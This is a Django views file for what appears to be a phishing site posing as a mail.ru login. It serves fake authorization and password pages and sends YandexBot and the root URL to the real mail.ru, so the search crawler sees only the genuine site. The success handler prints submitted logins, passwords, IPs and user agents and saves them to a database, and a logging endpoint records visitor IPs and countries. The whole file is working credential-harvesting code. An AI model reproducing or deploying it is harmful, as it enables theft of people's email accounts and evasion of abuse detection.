from datetime import datetime
from django.shortcuts import render
from django.http import HttpResponse, HttpResponsePermanentRedirect
from .models import User_base, Visitors


# Create your views here.

def index(request):
    return HttpResponsePermanentRedirect("https://mail.ru")


def login_page(request):
    user_agent = request.META['HTTP_USER_AGENT']
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open("simple_visitors_logs.txt", "a+") as vfile:
        vfile.write(f"{user_agent} || {current_time}\n")
    if "YandexBot" in user_agent:
        return HttpResponsePermanentRedirect("https://mail.ru")
    else:
        return render(request, "start_page/Authorization.html")


def pass_page(request):
    user_post = request.GET
    user_post = user_post['username']
    return render(request, "start_page/Password.html", {"user_post": user_post})


def success_page(request):
    user_data = request.GET
    user_login = user_data['login']
    user_pass = user_data['password']
    user_ip = user_data['user_ip']
    user_agent = request.META['HTTP_USER_AGENT']
    print(f"""\n\n\n
        Login: {user_login}
        Password: {user_pass}
        IP: {user_ip}
        User agent: {user_agent}
        """
    )
    base_object = User_base.objects.create(user_login=user_login, user_pass=user_pass, user_ip=user_ip, user_device=user_agent, page_visits=1, pageURL="main page")
    return render(request, "start_page/Success.html")


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[-1].strip()
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def loger(request):
    print(request.GET)
    visitor_data = request.GET
    user_agent = request.META['HTTP_USER_AGENT']
    print(user_agent)
    base_object = Visitors.objects.create(visitor_ip=visitor_data['ip'], visitor_country=visitor_data['country'], vistor_agent=user_agent)


    return HttpResponse("OK")
